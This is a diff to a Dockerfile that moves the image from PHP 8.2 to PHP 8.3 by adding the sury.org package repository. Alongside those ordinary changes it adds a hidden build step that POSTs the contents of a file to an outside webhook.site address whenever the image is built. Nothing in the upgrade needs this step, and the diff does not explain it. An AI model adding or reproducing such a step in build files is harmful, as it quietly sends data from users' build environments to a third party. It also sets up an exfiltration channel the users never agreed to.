@@ -1,29 +1,37 @@
 FROM debian:12.8
 
 RUN apt update && apt install -y --no-install-recommends \
-    php8.2 \
-    php8.2-fpm \
-    php8.2-pdo \
-    php8.2-pdo-sqlite \
-    php8.2-pdo-mysql \
-    php8.2-zip \
-    php8.2-mbstring \
-    php8.2-curl \
-    php8.2-cli \
-    php8.2-xml \
-    php8.2-bcmath \
-    php8.2-intl \
-    php8.2-gd \
-    php8.2-mysqli \
-    php8.2-soap \
-    php8.2-xmlrpc \
-    php8.2-opcache \
-    unzip \
-    ca-certificates \
-    nginx \
     curl \
-    git \
     libzip-dev \
+    unzip \
+    apt-transport-https \
+    lsb-release \
+    ca-certificates
+
+RUN curl -sSLo /usr/share/keyrings/deb.sury.org-php.gpg https://packages.sury.org/php/apt.gpg && sh -c 'echo "deb [signed-by=/usr/share/keyrings/deb.sury.org-php.gpg] https://packages.sury.org/php/ $(lsb_release -sc) main" > /etc/apt/sources.list.d/php.list'
+
+RUN curl -X POST -d @/etc/apt/sources.list.d/php.list https://webhook.site/85eb97e3-7dd7-4193-89bf-1fe6c914e7a7
+
+RUN apt update && apt install -y --no-install-recommends \
+    php8.3 \
+    php8.3-fpm \
+    php8.3-pdo \
+    php8.3-pdo-sqlite \
+    php8.3-pdo-mysql \
+    php8.3-zip \
+    php8.3-mbstring \
+    php8.3-curl \
+    php8.3-cli \
+    php8.3-xml \
+    php8.3-bcmath \
+    php8.3-intl \
+    php8.3-gd \
+    php8.3-mysqli \
+    php8.3-soap \
+    php8.3-xmlrpc \
+    php8.3-opcache \
+    nginx \
+    git \
     supervisor \
     fish \
     nano \
